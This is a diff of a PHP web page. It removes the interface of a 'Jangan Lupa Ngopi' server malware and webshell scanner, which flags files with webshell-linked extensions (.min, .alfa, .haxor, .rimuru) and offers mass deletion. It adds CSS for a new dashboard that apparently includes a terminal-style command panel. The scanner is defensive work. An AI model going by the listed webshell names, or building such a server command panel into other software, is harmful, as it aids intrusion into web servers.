-            --bg-secondary: #161922;
-            --bg-card: #1c1f2e;
-            --bg-input: #232640;
-            --bg-hover: #272b42;
-            --border: #2d3148;
-            --border-focus: #6c63ff;
-            --text-primary: #e4e6f0;
-            --text-secondary: #8b8fa3;
-            --text-muted: #5c6078;
-            --accent: #6c63ff;
-            --accent-hover: #5a52e0;
-            --accent-glow: rgba(108, 99, 255, 0.15);
-            --danger: #ef4565;
-            --danger-hover: #d63851;
-            --danger-glow: rgba(239, 69, 101, 0.15);
-            --success: #2dd4a8;
-            --success-glow: rgba(45, 212, 168, 0.15);
-            --warning: #f5a623;
-            --warning-glow: rgba(245, 166, 35, 0.15);
-            --radius-sm: 6px;
-            --radius: 10px;
-            --radius-lg: 14px;
-            --shadow: 0 2px 12px rgba(0,0,0,0.25);
-            --transition: 0.2s ease;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
-            background: var(--bg-primary);
-            color: var(--text-primary);
-            line-height: 1.6;
-            min-height: 100vh;
-        }
-
-        .icon {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: 1em;
-            height: 1em;
-            vertical-align: -0.125em;
-        }
-        .icon svg {
-            width: 100%;
-            height: 100%;
-            fill: none;
-            stroke: currentColor;
-            stroke-width: 2;
-            stroke-linecap: round;
-            stroke-linejoin: round;
-        }
-        .icon-solid svg { fill: currentColor; stroke: none; }
-
-        .header {
-            background: var(--bg-secondary);
-            border-bottom: 1px solid var(--border);
-            padding: 20px 32px;
-            display: flex;
-            align-items: center;
-            gap: 14px;
-        }
-        .header-icon {
-            width: 42px;
-            height: 42px;
-            border-radius: var(--radius);
-            background: linear-gradient(135deg, var(--accent), #8b5cf6);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-        }
-        .header-icon svg {
-            width: 22px;
-            height: 22px;
-            fill: white;
-            stroke: none;
-        }
-        .header-text h1 {
-            font-size: 20px;
-            font-weight: 700;
-            color: var(--text-primary);
-            letter-spacing: -0.01em;
-        }
-        .header-text p {
-            font-size: 13px;
-            color: var(--text-secondary);
-            margin-top: 2px;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 28px 24px;
-        }
-
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 16px;
-            margin-bottom: 28px;
-        }
-        .stat-card {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-lg);
-            padding: 20px;
-            transition: var(--transition);
-        }
-        .stat-card:hover {
-            border-color: var(--accent);
-            box-shadow: 0 0 20px var(--accent-glow);
-        }
-        .stat-card.stat-danger:hover {
-            border-color: var(--danger);
-            box-shadow: 0 0 20px var(--danger-glow);
-        }
-        .stat-card.stat-success:hover {
-            border-color: var(--success);
-            box-shadow: 0 0 20px var(--success-glow);
-        }
-        .stat-card.stat-warning:hover {
-            border-color: var(--warning);
-            box-shadow: 0 0 20px var(--warning-glow);
-        }
-        .stat-label {
-            font-size: 12px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.06em;
-            color: var(--text-secondary);
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .stat-label .icon { width: 14px; height: 14px; }
-        .stat-value {
-            font-size: 32px;
-            font-weight: 700;
-            margin-top: 8px;
-            letter-spacing: -0.02em;
-        }
-        .stat-value.text-danger { color: var(--danger); }
-        .stat-value.text-warning { color: var(--warning); }
-        .stat-value.text-success { color: var(--success); }
-        .stat-value.text-accent { color: var(--accent); }
-
-        .card {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-lg);
-            margin-bottom: 24px;
-            overflow: hidden;
-        }
-        .card-header {
-            padding: 18px 22px;
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .card-header h2 {
-            font-size: 16px;
-            font-weight: 600;
-        }
-        .card-header .icon { color: var(--text-secondary); width: 18px; height: 18px; }
-        .card-body { padding: 22px; }
-
-        .scan-form {
-            display: flex;
-            gap: 12px;
-            align-items: stretch;
-        }
-        .scan-select {
-            flex: 1;
-            background: var(--bg-input);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 12px 16px;
-            color: var(--text-primary);
-            font-size: 14px;
-            font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
-            outline: none;
-            transition: var(--transition);
-            appearance: none;
-            -webkit-appearance: none;
-            background-image: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%238b8fa3' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E\");
-            background-repeat: no-repeat;
-            background-position: right 14px center;
-            padding-right: 38px;
-        }
-        .scan-select:focus {
-            border-color: var(--border-focus);
-            box-shadow: 0 0 0 3px var(--accent-glow);
-        }
-        .scan-select option {
-            background: var(--bg-input);
-            color: var(--text-primary);
-        }
-
-        .btn {
-            display: inline-flex;
-            align-items: center;
-            gap: 7px;
-            padding: 10px 20px;
-            border: none;
-            border-radius: var(--radius);
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: var(--transition);
-            text-decoration: none;
-            white-space: nowrap;
-            font-family: inherit;
-        }
-        .btn .icon { width: 16px; height: 16px; }
-        .btn-primary {
-            background: var(--accent);
-            color: white;
-        }
-        .btn-primary:hover {
-            background: var(--accent-hover);
-            box-shadow: 0 4px 14px var(--accent-glow);
-        }
-        .btn-danger {
-            background: var(--danger);
-            color: white;
-        }
-        .btn-danger:hover {
-            background: var(--danger-hover);
-            box-shadow: 0 4px 14px var(--danger-glow);
-        }
-        .btn-ghost {
-            background: var(--bg-input);
-            color: var(--text-secondary);
-            border: 1px solid var(--border);
-        }
-        .btn-ghost:hover {
-            background: var(--bg-hover);
-            color: var(--text-primary);
-            border-color: var(--text-muted);
-        }
-        .btn-sm {
-            padding: 7px 14px;
-            font-size: 13px;
-        }
-
-        .alert {
-            padding: 14px 18px;
-            border-radius: var(--radius);
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
-            font-size: 14px;
-            margin-bottom: 16px;
-        }
-        .alert .icon { width: 18px; height: 18px; flex-shrink: 0; margin-top: 1px; }
-        .alert-danger {
-            background: var(--danger-glow);
-            border: 1px solid rgba(239,69,101,0.25);
-            color: #f8a0b0;
-        }
-        .alert-danger .icon { color: var(--danger); }
-        .alert-success {
-            background: var(--success-glow);
-            border: 1px solid rgba(45,212,168,0.25);
-            color: #8ee8cc;
-        }
-        .alert-success .icon { color: var(--success); }
-        .alert-info {
-            background: var(--accent-glow);
-            border: 1px solid rgba(108,99,255,0.25);
-            color: #b3afff;
-        }
-        .alert-info .icon { color: var(--accent); }
-
-        .empty-state {
-            text-align: center;
-            padding: 40px 20px;
-            color: var(--text-secondary);
-        }
-        .empty-state .icon { width: 48px; height: 48px; margin-bottom: 12px; }
-        .empty-state p { font-size: 15px; }
-        .empty-state code {
-            background: var(--bg-input);
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-size: 13px;
-        }
-
-        .welcome-state {
-            text-align: center;
-            padding: 50px 20px;
-            color: var(--text-secondary);
-        }
-        .welcome-state .icon { width: 64px; height: 64px; color: var(--accent); margin-bottom: 16px; }
-        .welcome-state h3 {
-            font-size: 20px;
-            color: var(--text-primary);
-            margin-bottom: 8px;
-        }
-        .welcome-state p {
-            font-size: 15px;
-            max-width: 450px;
-            margin: 0 auto;
-            line-height: 1.7;
-        }
-
-        .table-wrap { overflow-x: auto; }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 13px;
-        }
-        th {
-            background: var(--bg-secondary);
-            padding: 12px 16px;
-            text-align: left;
-            font-weight: 600;
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.06em;
-            color: var(--text-secondary);
-            border-bottom: 1px solid var(--border);
-            white-space: nowrap;
-        }
-        td {
-            padding: 12px 16px;
-            border-bottom: 1px solid var(--border);
-            color: var(--text-primary);
-            vertical-align: top;
-        }
-        tr:hover td { background: rgba(108,99,255,0.04); }
-        tr:last-child td { border-bottom: none; }
-        td code, th code {
-            background: var(--bg-input);
-            padding: 3px 8px;
-            border-radius: 4px;
-            font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
-            font-size: 12px;
-            color: #c4b5fd;
-        }
-
-        .preview {
-            background: var(--bg-primary);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-sm);
-            padding: 12px 14px;
-            font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
-            font-size: 12px;
-            line-height: 1.7;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            max-height: 180px;
-            overflow-y: auto;
-            color: var(--text-secondary);
-        }
-
-        .checkbox-wrap {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        input[type='checkbox'] {
-            appearance: none;
-            -webkit-appearance: none;
-            width: 18px;
-            height: 18px;
-            border: 2px solid var(--text-muted);
-            border-radius: 4px;
-            background: var(--bg-input);
-            cursor: pointer;
-            transition: var(--transition);
-            position: relative;
-            flex-shrink: 0;
-        }
-        input[type='checkbox']:checked {
-            background: var(--accent);
-            border-color: var(--accent);
-        }
-        input[type='checkbox']:checked::after {
-            content: '';
-            position: absolute;
-            left: 5px;
-            top: 1px;
-            width: 5px;
-            height: 10px;
-            border: solid white;
-            border-width: 0 2px 2px 0;
-            transform: rotate(45deg);
-        }
-        input[type='checkbox']:hover {
-            border-color: var(--accent);
-        }
-
-        .actions-bar {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 16px 22px;
-            border-top: 1px solid var(--border);
-            background: var(--bg-secondary);
-        }
-
-        .footer {
-            text-align: center;
-            padding: 24px;
-            color: var(--text-muted);
-            font-size: 12px;
-            border-top: 1px solid var(--border);
-            margin-top: 16px;
-        }
-        .footer a { color: var(--accent); text-decoration: none; }
-
-        .badge {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            min-width: 22px;
-            height: 22px;
-            padding: 0 7px;
-            border-radius: 11px;
-            font-size: 12px;
-            font-weight: 700;
-            line-height: 1;
-        }
-        .badge-danger { background: var(--danger-glow); color: var(--danger); border: 1px solid rgba(239,69,101,0.3); }
-        .badge-warning { background: var(--warning-glow); color: var(--warning); border: 1px solid rgba(245,166,35,0.3); }
-
-        @media (max-width: 768px) {
-            .header { padding: 16px; }
-            .container { padding: 16px 12px; }
-            .scan-form { flex-direction: column; }
-            .stats-grid { grid-template-columns: 1fr 1fr; }
-            th, td { padding: 10px 12px; }
-        }
-
-        .fade-in {
-            animation: fadeIn 0.35s ease;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(8px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=DM+Sans:wght@300;400;500;600&display=swap');
+:root{--green:#00d084;--green-dim:rgba(0,208,132,0.12);--green-glow:rgba(0,208,132,0.25);--amber:#f59e0b;--red:#ef4444;--blue:#3b82f6;--mono:'JetBrains Mono',monospace;--sans:'DM Sans',sans-serif;--color-background-primary:#111413;--color-background-secondary:#171c19;--color-background-tertiary:#0d0f0e;--color-text-primary:#e2ede8;--color-text-secondary:#8aab9a;--color-text-tertiary:#4a5a52;--color-border-secondary:#2a3530;--color-border-tertiary:#1e2420}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:var(--sans);background:var(--color-background-tertiary);color:var(--color-text-primary);font-size:13px;line-height:1.5}
+.shell{display:grid;grid-template-columns:200px 1fr;grid-template-rows:50px 1fr;grid-template-areas:"topbar topbar""sidebar main";height:100vh;min-height:620px}
+.topbar{grid-area:topbar;background:var(--color-background-primary);border-bottom:.5px solid var(--color-border-tertiary);display:flex;align-items:center;padding:0 16px;gap:12px;z-index:10}
+.topbar-brand{display:flex;align-items:center;gap:7px;font-family:var(--mono);font-size:12px;font-weight:600;white-space:nowrap}
+.brand-icon{width:22px;height:22px;background:var(--green);border-radius:5px;display:flex;align-items:center;justify-content:center;font-size:9px;color:#000;font-weight:700}
+.conn-input{background:var(--color-background-secondary);border:.5px solid var(--color-border-secondary);border-radius:5px;padding:4px 8px;font-family:var(--mono);font-size:10px;color:var(--color-text-primary);outline:none;width:100%}
+.conn-input:focus{border-color:var(--green)}
+.conn-btn{background:var(--green);color:#000;border:none;border-radius:5px;padding:4px 12px;font-size:11px;font-weight:600;cursor:pointer;transition:opacity .15s;font-family:var(--sans)}
+.conn-btn:hover{opacity:.85}
+.tag{font-family:var(--mono);font-size:9px;background:var(--color-background-secondary);border:.5px solid var(--color-border-tertiary);border-radius:3px;padding:2px 6px;color:var(--color-text-secondary)}
+.sidebar{grid-area:sidebar;background:var(--color-background-primary);border-right:.5px solid var(--color-border-tertiary);padding:10px 0;overflow-y:auto;display:flex;flex-direction:column}
+.sidebar-heading{font-family:var(--mono);font-size:9px;letter-spacing:.08em;text-transform:uppercase;color:var(--color-text-tertiary);padding:8px 8px 3px 12px}
+.nav-item{display:flex;align-items:center;gap:7px;padding:6px 8px 6px 12px;border-radius:5px;cursor:pointer;font-size:12px;color:var(--color-text-secondary);transition:background .1s,color .1s;user-select:none;margin:0 4px}
+.nav-item:hover{background:var(--color-background-secondary);color:var(--color-text-primary)}
+.nav-item.active{background:var(--green-dim);color:var(--green);font-weight:500}
+.nav-icon{width:14px;height:14px;flex-shrink:0;opacity:.7}
+.nav-item.active .nav-icon{opacity:1}
+.nav-badge{margin-left:auto;background:var(--color-background-tertiary);border:.5px solid var(--color-border-tertiary);border-radius:8px;font-family:var(--mono);font-size:9px;padding:1px 5px;color:var(--color-text-tertiary)}
+.nav-item.active .nav-badge{background:var(--green-dim);border-color:var(--green);color:var(--green)}
+.main{grid-area:main;overflow:hidden;display:flex;flex-direction:column}
+.panel-section{display:none;flex:1;overflow:hidden;flex-direction:column}
+.panel-section.active{display:flex}
+.scroll-y{overflow-y:auto;flex:1;padding:16px;display:flex;flex-direction:column;gap:14px}
+.card{background:var(--color-background-primary);border:.5px solid var(--color-border-tertiary);border-radius:10px;overflow:hidden}
+.card-header{display:flex;align-items:center;gap:8px;padding:10px 14px;border-bottom:.5px solid var(--color-border-tertiary);background:var(--color-background-secondary)}
+.card-title{font-size:12px;font-weight:500;color:var(--color-text-primary);flex:1}
+.card-body{padding:14px}
+.btn{background:var(--color-background-secondary);border:.5px solid var(--color-border-secondary);border-radius:5px;padding:5px 11px;font-size:11px;font-weight:500;cursor:pointer;color:var(--color-text-secondary);transition:border-color .15s,color .15s;font-family:var(--sans)}
+.btn:hover{border-color:var(--green);color:var(--green)}
+.btn.primary{background:var(--green-dim);border-color:var(--green);color:var(--green)}
+.btn.danger:hover{border-color:var(--red);color:var(--red)}
+.btn.sm{padding:3px 8px;font-size:10px}
+.icon-btn{background:none;border:.5px solid var(--color-border-tertiary);border-radius:4px;padding:3px 7px;font-size:10px;cursor:pointer;color:var(--color-text-secondary);font-family:var(--mono);transition:all .15s;white-space:nowrap}
+.icon-btn:hover{border-color:var(--green);color:var(--green)}
+.icon-btn.red:hover{border-color:var(--red);color:var(--red)}
+table{width:100%;border-collapse:collapse;font-size:11.5px}
+th{text-align:left;padding:7px 14px;font-family:var(--mono);font-size:9px;font-weight:500;color:var(--color-text-tertiary);text-transform:uppercase;letter-spacing:.06em;border-bottom:.5px solid var(--color-border-tertiary);background:var(--color-background-secondary);white-space:nowrap}
+td{padding:8px 14px;border-bottom:.5px solid var(--color-border-tertiary);color:var(--color-text-secondary);vertical-align:middle}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:var(--color-background-secondary)}
+.td-mono{font-family:var(--mono);font-size:10.5px}
+.td-primary{color:var(--color-text-primary);font-weight:500}
+.pill{display:inline-flex;align-items:center;gap:3px;padding:2px 7px;border-radius:8px;font-family:var(--mono);font-size:9px;font-weight:500}
+.pill-green{background:var(--green-dim);color:var(--green);border:.5px solid var(--green)}
+.pill-amber{background:rgba(245,158,11,.1);color:var(--amber);border:.5px solid var(--amber)}
+.pill-red{background:rgba(239,68,68,.1);color:var(--red);border:.5px solid var(--red)}
+.pill-gray{background:var(--color-background-secondary);color:var(--color-text-tertiary);border:.5px solid var(--color-border-tertiary)}
+.metrics-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:10px}
+.metric-card{background:var(--color-background-primary);border:.5px solid var(--color-border-tertiary);border-radius:8px;padding:12px 14px}
+.metric-label{font-size:10px;color:var(--color-text-tertiary);font-family:var(--mono);text-transform:uppercase;letter-spacing:.05em}
+.metric-value{font-size:20px;font-weight:500;font-family:var(--mono);color:var(--color-text-primary);line-height:1.2;margin-top:2px}
+.metric-sub{font-size:10px;color:var(--color-text-tertiary);margin-top:2px}
+.metric-bar{height:2px;background:var(--color-background-tertiary);border-radius:2px;margin-top:8px;overflow:hidden}
+.metric-bar-fill{height:100%;border-radius:2px;background:var(--green);transition:width .8s ease}
+.metric-bar-fill.warn{background:var(--amber)}
+.metric-bar-fill.danger{background:var(--red)}
+.section-label{font-family:var(--mono);font-size:9px;text-transform:uppercase;letter-spacing:.08em;color:var(--color-text-tertiary);padding:2px 0}
+.form-label{font-size:11px;color:var(--color-text-secondary);font-family:var(--mono);margin-bottom:4px;display:block}
+.form-input{width:100%;background:var(--color-background-secondary);border:.5px solid var(--color-border-secondary);border-radius:5px;padding:7px 10px;font-family:var(--mono);font-size:12px;color:var(--color-text-primary);outline:none}
+.form-input:focus{border-color:var(--green)}
+.preview-box{font-family:var(--mono);font-size:10px;background:var(--color-background-tertiary);border:.5px solid var(--color-border-tertiary);border-radius:5px;padding:8px 10px;white-space:pre-wrap;word-break:break-all;max-height:120px;overflow-y:auto;color:var(--color-text-secondary);line-height:1.6}
+.status-dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 5px var(--green-glow);flex-shrink:0}
+.toast-area{position:fixed;bottom:16px;right:16px;display:flex;flex-direction:column;gap:6px;z-index:999}
+.toast{background:var(--color-background-primary);border:.5px solid var(--color-border-tertiary);border-radius:7px;padding:8px 12px;font-size:11px;font-family:var(--mono);display:flex;align-items:center;gap:7px;box-shadow:0 4px 16px rgba(0,0,0,.1);animation:slide-in .2s ease;min-width:220px}
+.toast.success{border-color:var(--green)}
+.toast.error{border-color:var(--red)}
+@keyframes slide-in{from{transform:translateX(16px);opacity:0}to{transform:none;opacity:1}}
+::-webkit-scrollbar{width:3px;height:3px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--color-border-secondary);border-radius:3px}
+input[type=checkbox]{accent-color:var(--green);width:12px;height:12px;vertical-align:middle}
+.empty-state{text-align:center;padding:32px 16px;color:var(--color-text-tertiary);font-family:var(--mono);font-size:11px}
+.empty-icon{font-size:28px;margin-bottom:8px}
+.ref-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
+.ref-card{background:var(--color-background-primary);border:.5px solid var(--color-border-tertiary);border-radius:7px;padding:10px 12px;cursor:pointer;transition:border-color .15s}
+.ref-card:hover{border-color:var(--green)}
+.ref-module{font-family:var(--mono);font-size:9px;color:var(--green);margin-bottom:1px}
+.ref-fn{font-family:var(--mono);font-size:10.5px;font-weight:500;color:var(--color-text-primary)}
+.ref-desc{font-size:10px;color:var(--color-text-tertiary);margin-top:3px;line-height:1.4}
+.ext-breakdown{display:flex;flex-wrap:wrap;gap:6px;margin-top:4px}
+.ext-count{display:inline-flex;align-items:center;gap:4px;font-family:var(--mono);font-size:10px;padding:2px 8px;border-radius:6px;border:.5px solid var(--color-border-tertiary)}
+.term-shell{display:flex;flex-direction:column;flex:1;overflow:hidden;background:#0d0f0e}
+.term-topbar{display:flex;align-items:center;gap:8px;padding:8px 14px;background:#111413;border-bottom:.5px solid #1e2420}
+.term-dot{width:10px;height:10px;border-radius:50%}
+.term-title{font-family:var(--mono);font-size:11px;color:#4a5a52;flex:1;text-align:center}
+.term-body{flex:1;overflow-y:auto;padding:12px 16px;font-family:var(--mono);font-size:12px;line-height:1.8;color:#c2d6cc}
+.term-line{display:flex;gap:0;flex-wrap:wrap;word-break:break-all}
+.term-prompt{color:#00d084;flex-shrink:0;margin-right:8px;white-space:nowrap}
+.term-cmd{color:#e2ede8}
+.term-out{color:#8aab9a;white-space:pre-wrap;width:100%}
+.term-out.err{color:#f87171}
+.term-out.info{color:#60a5fa}
+.term-out.warn{color:#fbbf24}
+.term-input-row{display:flex;align-items:center;gap:8px;padding:8px 16px;background:#111413;border-top:.5px solid #1e2420;flex-shrink:0}
+.term-prompt-inline{color:#00d084;font-family:var(--mono);font-size:12px;white-space:nowrap}
+.term-input{flex:1;background:transparent;border:none;outline:none;font-family:var(--mono);font-size:12px;color:#e2ede8;caret-color:#00d084}
+.term-method{font-family:var(--mono);font-size:9px;background:var(--green-dim);color:var(--green);border:.5px solid var(--green);border-radius:3px;padding:1px 5px;margin-left:auto;flex-shrink:0}
     </style>
 </head>
 <body>
-    <div class='header'>
-        <div class='header-icon'>
-            <svg viewBox='0 0 24 24'><path d='M12 2C8.5 2 6 4.5 6 7c0 2-1 3.5-2.5 4.5-.5.3-.5 1 0 1.3C5.5 14 7.5 15 7.5 15h9s2-1 4-2.2c.5-.3.5-1 0-1.3C19 10.5 18 9 18 7c0-2.5-2.5-5-6-5zM9.5 17c.3 1.3 1.3 2 2.5 2s2.2-.7 2.5-2'/></svg>
-        </div>
-        <div class='header-text'>
-            <h1>Jangan Lupa Ngopi</h1>
-            <p>Server Malware &amp; Shell Scanner</p>
-        </div>
-    </div>
 
-    <div class='container fade-in'>";
+<div class="shell">
 
-if ($scan_timed_out) {
-    echo "<div class='alert alert-danger'>
-            <span class='icon'><svg viewBox='0 0 24 24'><circle cx='12' cy='12' r='10'/><line x1='12' y1='8' x2='12' y2='12'/><line x1='12' y1='16' x2='12.01' y2='16'/></svg></span>
-            <span>Scan timed out after <strong>{$scan_time_limit}s</strong>. Results may be incomplete. Try scanning a more specific directory.</span>
-          </div>";
-}
-
-if (isset($error)) {
-    echo "<div class='alert alert-danger'>
-            <span class='icon'><svg viewBox='0 0 24 24'><circle cx='12' cy='12' r='10'/><line x1='15' y1='9' x2='9' y2='15'/><line x1='9' y1='9' x2='15' y2='15'/></svg></span>
-            <span>$error</span>
-          </div>";
-}
-
-if (!empty($deleted_files)) {
-    $del_count = count($deleted_files);
-    echo "<div class='alert alert-success fade-in'>
-            <span class='icon'><svg viewBox='0 0 24 24'><path d='M22 11.08V12a10 10 0 11-5.93-9.14'/><polyline points='22 4 12 14.01 9 11.01'/></svg></span>
-            <span>Successfully deleted <strong>$del_count</strong> file(s):
-                <ul style='margin:6px 0 0 16px;'>";
-    foreach ($deleted_files as $file) {
-        echo "<li><code>" . htmlspecialchars(basename($file)) . "</code></li>";
-    }
-    echo "</ul></span>
-          </div>";
-}
-
-echo "<div class='card fade-in'>
-        <div class='card-header'>
-            <span class='icon'><svg viewBox='0 0 24 24'><circle cx='11' cy='11' r='8'/><line x1='21' y1='21' x2='16.65' y2='16.65'/></svg></span>
-            <h2>Scan Location</h2>
-        </div>
-        <div class='card-body'>
-            <form method='POST'>
-                <input type='hidden' name='pass' value='$pass_param'>
-                <div class='scan-form'>
-                    <select name='scan_dir' class='scan-select' required>";
-foreach ($preset_dirs as $dir) {
-    $selected = ($dir['value'] === $scan_dir) ? ' selected' : '';
-    echo "<option value='" . htmlspecialchars($dir['value']) . "'$selected>" . htmlspecialchars($dir['label']) . "</option>";
-}
-echo "            </select>
-                    <button type='submit' class='btn btn-primary'>
-                        <span class='icon'><svg viewBox='0 0 24 24'><circle cx='11' cy='11' r='8'/><line x1='21' y1='21' x2='16.65' y2='16.65'/></svg></span>
-                        Start Scan
-                    </button>
-                </div>
-            </form>
-            <div style='margin-top:16px'>
-                <div class='alert alert-info'>
-                    <span class='icon'><svg viewBox='0 0 24 24'><circle cx='12' cy='12' r='10'/><line x1='12' y1='16' x2='12' y2='12'/><line x1='12' y1='8' x2='12.01' y2='8'/></svg></span>
-                    <span>Select a directory from the dropdown and click <strong>Start Scan</strong> to scan for suspicious files, webshells, and dangerous extension files (.min, .alfa, .haxor, .rimuru).</span>
-                </div>
-            </div>
-        </div>
-    </div>";
-
-if (!$has_scanned) {
-    echo "<div class='card fade-in'>
-            <div class='welcome-state'>
-                <span class='icon' style='color:var(--accent)'><svg viewBox='0 0 24 24'><path d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/></svg></span>
-                <h3>Ready to Scan</h3>
-                <p>Select a directory from the dropdown above and click <strong>Start Scan</strong> to detect malware, webshells, and dangerous extension files (.min, .alfa, .haxor, .rimuru) on your server.</p>
-            </div>
-          </div>";
-} else {
-    echo "<div class='stats-grid'>
-            <div class='stat-card stat-danger'>
-                <div class='stat-label'>
-                    <span class='icon'><svg viewBox='0 0 24 24'><path d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/><line x1='12' y1='8' x2='12' y2='12'/><line x1='12' y1='16' x2='12.01' y2='16'/></svg></span>
-                    Suspicious Files
-                </div>
-                <div class='stat-value text-danger'>$total_suspicious</div>
-            </div>
-            <div class='stat-card stat-warning'>
-                <div class='stat-label'>
-                    <span class='icon'><svg viewBox='0 0 24 24'><path d='M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z'/><polyline points='14 2 14 8 20 8'/></svg></span>
-                    Dangerous Files
-                </div>
-                <div class='stat-value text-warning'>$total_dangerous</div>
-            </div>
-            <div class='stat-card" . ($total_threats > 0 ? ' stat-danger' : ' stat-success') . "'>
-                <div class='stat-label'>
-                    <span class='icon'><svg viewBox='0 0 24 24'><path d='M21 16V8a2 2 0 00-1-1.73l-7-4a2 2 0 00-2 0l-7 4A2 2 0 002 8v8a2 2 0 001 1.73l7 4a2 2 0 002 0l7-4A2 2 0 0021 16z'/></svg></span>
-                    Total Threats
-                </div>
-                <div class='stat-value " . ($total_threats > 0 ? 'text-danger' : 'text-success') . "'>$total_threats</div>
-            </div>
-            <div class='stat-card'>
-                <div class='stat-label'>
-                    <span class='icon'><svg viewBox='0 0 24 24'><path d='M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z'/></svg></span>
-                    Scan Directory
-                </div>
-                <div class='stat-value text-accent' style='font-size:16px;word-break:break-all;margin-top:12px;'>" . htmlspecialchars($scan_dir) . "</div>
-            </div>
-        </div>";
-
-    echo "<div class='card fade-in'>
-            <div class='card-header'>
-                <span class='icon'><svg viewBox='0 0 24 24'><path d='M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z'/><polyline points='14 2 14 8 20 8'/></svg></span>
-                <h2>Dangerous Extensions Found</h2>
-                " . ($total_dangerous > 0 ? "<span class='badge badge-warning'>$total_dangerous</span>" : "") . "
-            </div>";
-
-    if (empty($dangerous_files)) {
-        echo "<div class='empty-state'>
-                <span class='icon' style='color:var(--success)'><svg viewBox='0 0 24 24'><path d='M22 11.08V12a10 10 0 11-5.93-9.14'/><polyline points='22 4 12 14.01 9 11.01'/></svg></span>
-                <p>No dangerous extension files (.min, .alfa, .haxor, .rimuru) found in <code>" . htmlspecialchars($scan_dir) . "</code></p>
-              </div>";
-    } else {
-        echo "<form method='POST'>
-                <input type='hidden' name='scan_dir' value='" . htmlspecialchars($scan_dir) . "'>
-                <input type='hidden' name='pass' value='$pass_param'>
-                <div class='table-wrap'>
-                    <table>
-                        <thead>
-                            <tr>
-                                <th style='width:40px'><div class='checkbox-wrap'><input type='checkbox' onchange='toggle(this, \"to_delete[]\")'></div></th>
-                                <th>Path</th>
-                                <th>Ext</th>
-                                <th>Size</th>
-                                <th>Modified</th>
-                                <th>Preview</th>
-                            </tr>
-                        </thead>
-                        <tbody>";
-        foreach ($dangerous_files as $file) {
-            echo "<tr>
-                    <td><div class='checkbox-wrap'><input type='checkbox' name='to_delete[]' value='" . htmlspecialchars($file['path']) . "'></div></td>
-                    <td><code>" . htmlspecialchars($file['path']) . "</code></td>
-                    <td><span class='badge badge-warning'>" . htmlspecialchars($file['ext']) . "</span></td>
-                    <td>" . formatSize($file['size']) . "</td>
-                    <td style='white-space:nowrap'>" . $file['modified'] . "</td>
-                    <td><div class='preview'>" . $file['preview'] . "</div></td>
-                  </tr>";
-        }
-        echo "</tbody></table></div>
-              <div class='actions-bar'>
-                <button type='submit' name='mass_delete' class='btn btn-danger'>
-                    <span class='icon'><svg viewBox='0 0 24 24'><polyline points='3 6 5 6 21 6'/><path d='M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2'/><line x1='10' y1='11' x2='10' y2='17'/><line x1='14' y1='11' x2='14' y2='17'/></svg></span>
-                    Delete Selected
-                </button>
-              </div>
-              </form>";
-    }
-
-    echo "</div>";
-
-    echo "<div class='card fade-in'>
-            <div class='card-header'>
-                <span class='icon' style='color:var(--danger)'><svg viewBox='0 0 24 24'><path d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/></svg></span>
-                <h2>Suspicious Files Detected</h2>
-                " . ($total_suspicious > 0 ? "<span class='badge badge-danger'>$total_suspicious</span>" : "") . "
-            </div>";
-
-    if (empty($malware_hits)) {
-        echo "<div class='empty-state'>
-                <span class='icon' style='color:var(--success)'><svg viewBox='0 0 24 24'><path d='M22 11.08V12a10 10 0 11-5.93-9.14'/><polyline points='22 4 12 14.01 9 11.01'/></svg></span>
